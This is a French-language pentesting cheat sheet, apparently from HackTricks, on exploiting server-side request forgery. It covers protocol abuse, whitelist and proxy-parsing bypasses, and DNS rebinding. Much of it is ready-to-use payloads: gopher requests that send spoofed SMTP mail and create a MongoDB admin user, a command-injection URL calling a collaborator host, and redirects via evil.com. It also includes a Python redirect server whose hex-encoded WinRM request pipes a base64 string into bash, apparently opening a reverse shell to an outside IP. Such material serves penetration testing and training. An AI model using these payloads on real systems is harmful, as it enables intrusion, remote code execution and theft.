# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Une vulnérabilité de **Server-side Request Forgery (SSRF)** se produit lorsqu'un attaquant manipule une **application côté serveur** pour effectuer des **requêtes HTTP** vers un domaine de son choix. Cette vulnérabilité expose le serveur à des requêtes externes arbitraires dirigées par l'attaquant.

## Capture SSRF

La première chose que vous devez faire est de capturer une interaction SSRF générée par vous. Pour capturer une interaction HTTP ou DNS, vous pouvez utiliser des outils tels que :

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - Un Burp Collaborator utilisant ngrok

## Contournement des domaines sur liste blanche

En général, vous constaterez que le SSRF ne fonctionne que dans **certains domaines ou URL sur liste blanche**. Dans la page suivante, vous avez une **compilation de techniques pour essayer de contourner cette liste blanche** :

{{#ref}}
url-format-bypass.md
{{#endref}}

### Contournement via redirection ouverte

Si le serveur est correctement protégé, vous pourriez **contourner toutes les restrictions en exploitant une redirection ouverte à l'intérieur de la page web**. Parce que la page web permettra **SSRF vers le même domaine** et suivra probablement **les redirections**, vous pouvez exploiter la **redirection ouverte pour faire accéder le serveur à n'importe quelle ressource interne**.\
Lisez-en plus ici : [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protocoles

- **file://**
- Le schéma d'URL `file://` est référencé, pointant directement vers `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Le schéma d'URL DICT est décrit comme étant utilisé pour accéder aux définitions ou aux listes de mots via le protocole DICT. Un exemple donné illustre une URL construite ciblant un mot spécifique, une base de données et un numéro d'entrée, ainsi qu'un exemple d'un script PHP pouvant être potentiellement mal utilisé pour se connecter à un serveur DICT en utilisant des identifiants fournis par l'attaquant : `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identifié comme un protocole pour le transfert de fichiers sécurisé via un shell sécurisé, un exemple est fourni montrant comment un script PHP pourrait être exploité pour se connecter à un serveur SFTP malveillant : `url=sftp://generic.com:11111/`
- **TFTP://**
- Le protocole de transfert de fichiers trivial, fonctionnant sur UDP, est mentionné avec un exemple d'un script PHP conçu pour envoyer une requête à un serveur TFTP. Une requête TFTP est faite à 'generic.com' sur le port '12346' pour le fichier 'TESTUDPPACKET' : `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Ce segment couvre le protocole d'accès aux annuaires léger, en soulignant son utilisation pour gérer et accéder aux services d'information d'annuaire distribués sur les réseaux IP. Interagissez avec un serveur LDAP sur localhost : `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Une méthode est décrite pour exploiter les vulnérabilités SSRF afin d'interagir avec les services SMTP sur localhost, y compris des étapes pour révéler des noms de domaine internes et d'autres actions d'investigation basées sur ces informations.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - contournement de WAF**
- Si le SSRF est exécuté par **curl**, curl a une fonctionnalité appelée [**URL globbing**](https://everything.curl.dev/cmdline/globbing) qui pourrait être utile pour contourner les WAF. Par exemple, dans ce [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi), vous pouvez trouver cet exemple pour un **path traversal via le protocole `file`** :
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- La capacité du protocole Gopher à spécifier l'IP, le port et les octets pour la communication avec le serveur est discutée, ainsi que des outils comme Gopherus et remote-method-guesser pour créer des charges utiles. Deux utilisations distinctes sont illustrées :

### Gopher://

En utilisant ce protocole, vous pouvez spécifier l'**IP, le port et les octets** que vous souhaitez que le serveur **envoie**. Ensuite, vous pouvez essentiellement exploiter un SSRF pour **communiquer avec n'importe quel serveur TCP** (mais vous devez d'abord savoir comment parler au service).\
Heureusement, vous pouvez utiliser [Gopherus](https://github.com/tarunkant/Gopherus) pour créer des charges utiles pour plusieurs services. De plus, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) peut être utilisé pour créer des charges utiles _gopher_ pour les services _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Connexion inverse à 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Créer un utilisateur avec le nom d'utilisateur=admin avec le mot de passe=admin123 et avec la permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Others

Les logiciels d'analyse sur les serveurs enregistrent souvent l'en-tête Referrer pour suivre les liens entrants, une pratique qui expose involontairement les applications à des vulnérabilités de Server-Side Request Forgery (SSRF). Cela est dû au fait que ces logiciels peuvent visiter des URL externes mentionnées dans l'en-tête Referrer pour analyser le contenu des sites référents. Pour découvrir ces vulnérabilités, le plugin Burp Suite "**Collaborator Everywhere**" est conseillé, tirant parti de la manière dont les outils d'analyse traitent l'en-tête Referer pour identifier les surfaces d'attaque SSRF potentielles.

## SSRF via SNI data from certificate

Une mauvaise configuration qui pourrait permettre la connexion à n'importe quel backend à travers une configuration simple est illustrée avec un exemple de configuration Nginx :
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Dans cette configuration, la valeur du champ Server Name Indication (SNI) est directement utilisée comme adresse du backend. Cette configuration expose une vulnérabilité au Server-Side Request Forgery (SSRF), qui peut être exploitée en spécifiant simplement l'adresse IP ou le nom de domaine souhaité dans le champ SNI. Un exemple d'exploitation pour forcer une connexion à un backend arbitraire, tel que `internal.host.com`, en utilisant la commande `openssl` est donné ci-dessous :
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Téléchargement de fichier Wget](../file-upload/#wget-file-upload-ssrf-trick)

## SSRF avec injection de commande

Il peut être utile d'essayer un payload comme : `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Rendu des PDF

Si la page web crée automatiquement un PDF avec certaines informations que vous avez fournies, vous pouvez **insérer du JS qui sera exécuté par le créateur de PDF** lui-même (le serveur) lors de la création du PDF et vous pourrez abuser d'un SSRF. [**Trouvez plus d'informations ici**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## De SSRF à DoS

Créez plusieurs sessions et essayez de télécharger des fichiers lourds en exploitant le SSRF depuis les sessions.

## Fonctions PHP SSRF

Vérifiez la page suivante pour des fonctions PHP vulnérables et même des fonctions Wordpress :

{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## Redirection SSRF vers Gopher

Pour certaines exploitations, vous pourriez avoir besoin d'**envoyer une réponse de redirection** (potentiellement pour utiliser un protocole différent comme gopher). Ici, vous avez différents codes python pour répondre avec une redirection :
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Proxies mal configurés pour SSRF

Tricks [**de cet article**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Code vulnérable du proxy Flask</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask permet d'utiliser **`@`** comme caractère initial, ce qui permet de faire de **l'hôte initial le nom d'utilisateur** et d'injecter un nouveau. Requête d'attaque :
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Code vulnérable :

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Il a été découvert qu'il est possible de **commencer le chemin** d'une requête avec le caractère **`;`** ce qui permet ensuite d'utiliser **`@`** et d'injecter un nouvel hôte à accéder. Requête d'attaque :
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### Serveur Web Intégré PHP <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Code PHP vulnérable</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP permet l'utilisation du **caractère `*` avant une barre oblique dans le chemin** de l'URL, cependant, il a d'autres limitations comme le fait qu'il ne peut être utilisé que pour le chemin racine `/` et que les points `.` ne sont pas autorisés avant la première barre oblique, il est donc nécessaire d'utiliser une adresse IP encodée en hexadécimal sans point par exemple :
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Si vous avez des **problèmes** pour **exfiltrer du contenu d'une IP locale** à cause de **CORS/SOP**, **DNS Rebidding** peut être utilisé pour contourner cette limitation :

{{#ref}}
../cors-bypass.md
{{#endref}}

### DNS Rebidding Automatisé

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) est un outil pour effectuer des attaques de [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). Il inclut les composants nécessaires pour rebinder l'adresse IP du nom DNS du serveur d'attaque à l'adresse IP de la machine cible et pour servir des charges utiles d'attaque afin d'exploiter des logiciels vulnérables sur la machine cible.

Consultez également le **serveur public en cours d'exécution à** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + ID de session TLS/Ticket de session

Exigences :

- **SSRF**
- **Sessions TLS sortantes**
- **Choses sur des ports locaux**

Attaque :

1. Demander à l'utilisateur/bot d'**accéder** à un **domaine** contrôlé par l'**attaquant**
2. Le **TTL** du **DNS** est de **0** sec (donc la victime vérifiera à nouveau l'IP du domaine bientôt)
3. Une **connexion TLS** est créée entre la victime et le domaine de l'attaquant. L'attaquant introduit la **charge utile à l'intérieur** de l'**ID de session ou du ticket de session**.
4. Le **domaine** commencera une **boucle infinie** de redirections contre **lui-même**. L'objectif est de faire en sorte que l'utilisateur/bot accède au domaine jusqu'à ce qu'il effectue **à nouveau** une **demande DNS** du domaine.
5. Dans la demande DNS, une adresse **IP privée** est donnée **maintenant** (127.0.0.1 par exemple)
6. L'utilisateur/bot essaiera de **rétablir la connexion TLS** et pour ce faire, il **enverra** l'**ID de session/Ticket ID** (où la **charge utile** de l'attaquant était contenue). Donc félicitations, vous avez réussi à demander à l'**utilisateur/bot de s'attaquer lui-même**.

Notez que pendant cette attaque, si vous souhaitez attaquer localhost:11211 (_memcache_), vous devez faire en sorte que la victime établisse la connexion initiale avec www.attacker.com:11211 (le **port doit toujours être le même**).\
Pour **effectuer cette attaque, vous pouvez utiliser l'outil** : [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Pour **plus d'informations**, jetez un œil à la conférence où cette attaque est expliquée : [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

La différence entre un SSRF aveugle et un SSRF non aveugle est que dans le SSRF aveugle, vous ne pouvez pas voir la réponse de la demande SSRF. Il est donc plus difficile d'exploiter car vous ne pourrez exploiter que des vulnérabilités bien connues.

### SSRF basé sur le temps

**Vérifier le temps** des réponses du serveur peut **permettre de savoir si une ressource existe ou non** (peut-être qu'il faut plus de temps pour accéder à une ressource existante qu'à une qui n'existe pas)

## Exploitation SSRF dans le Cloud

Si vous trouvez une vulnérabilité SSRF dans une machine fonctionnant dans un environnement cloud, vous pourriez être en mesure d'obtenir des informations intéressantes sur l'environnement cloud et même des identifiants :

{{#ref}}
cloud-ssrf.md
{{#endref}}

## Plateformes vulnérables à SSRF

Plusieurs plateformes connues contiennent ou ont contenu des vulnérabilités SSRF, vérifiez-les dans :

{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Outils

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Outil pour détecter et exploiter les vulnérabilités SSRF

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Article de blog sur Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Cet outil génère des charges utiles Gopher pour :

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Article de blog sur l'utilisation de SSRF](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ est un scanner de vulnérabilités _Java RMI_ qui prend en charge les opérations d'attaque pour la plupart des vulnérabilités _Java RMI_ courantes. La plupart des opérations disponibles prennent en charge l'option `--ssrf`, pour générer une charge utile _SSRF_ pour l'opération demandée. Avec l'option `--gopher`, des charges utiles _gopher_ prêtes à l'emploi peuvent être générées directement.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy est un serveur proxy HTTP multi-threadé conçu pour tunneliser le trafic HTTP des clients à travers des serveurs HTTP vulnérables à la falsification de requêtes côté serveur (SSRF).

### Pour pratiquer

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## Références

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)

{{#include ../../banners/hacktricks-training.md}}
